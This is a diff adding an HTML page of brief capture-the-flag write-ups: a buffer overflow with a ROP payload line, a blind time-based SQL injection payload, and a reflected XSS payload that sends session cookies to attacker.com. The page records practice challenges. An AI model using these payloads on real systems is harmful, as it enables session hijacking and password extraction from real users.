@@ -1,0 +1,92 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>CTF Writeups — Cyber Gladiator</title>
+
+<style>
+  body{
+    margin:0;
+    background:#0c0f12;
+    color:#e7edf1;
+    font-family:system-ui;
+    padding:40px;
+  }
+  a{color:#2fb3ff; text-decoration:none}
+  .wrap{max-width:900px; margin:auto}
+
+  header{
+    margin-bottom:30px;
+    background:#13171c;
+    padding:20px;
+    border-radius:12px;
+    border:1px solid rgba(255,255,255,0.05);
+  }
+  .entry{
+    background:#151a20;
+    border:1px solid rgba(255,255,255,0.05);
+    padding:18px;
+    border-radius:10px;
+    margin-bottom:18px;
+  }
+  .date{font-size:12px; opacity:.6}
+  .cmd{
+    font-family:monospace;
+    background:#111419;
+    padding:8px;
+    display:block;
+    border-radius:6px;
+    font-size:13px;
+    margin-top:10px;
+  }
+  h1{margin:0;font-size:30px}
+</style>
+</head>
+
+<body>
+<div class="wrap">
+
+<header>
+  <h1>CTF Writeups</h1>
+  <p><a href="blog.html">← Back to Blog</a></p>
+</header>
+
+<div class="entry">
+  <h2>🛡️ Buffer Overflow — "Buffer-v1"</h2>
+  <div class="date">Posted: 2025-10-30</div>
+  <p>
+    Classic BOF challenge. Vulnerability was in <b>strcpy()</b> without bounds checking.
+    Built an exploit using padding → saved EIP overwrite → ROP chain.
+  </p>
+  <span class="cmd">
+    $ python3 exploit.py  
+    payload = b"A"*112 + p32(ret_addr) + rop_chain
+  </span>
+</div>
+
+<div class="entry">
+  <h2>🔥 SQL Injection — "Blind Truth"</h2>
+  <div class="date">Posted: 2025-11-12</div>
+  <p>
+    Blind boolean-based SQLi. Extracted db char-by-char using time delays.
+  </p>
+  <span class="cmd">
+    ' OR IF(SUBSTR(password,1,1)='a', SLEEP(3), 0)-- 
+  </span>
+</div>
+
+<div class="entry">
+  <h2>⚔️ Web Exploitation — "Portal-XSS"</h2>
+  <div class="date">Posted: 2025-09-21</div>
+  <p>
+    Found a reflected XSS via search parameter. Used payload to steal session cookies during the challenge.
+  </p>
+  <span class="cmd">
+    &lt;script&gt;fetch('https://attacker.com?c='+document.cookie)&lt;/script&gt;
+  </span>
+</div>
+
+</div>
+</body>
+</html>
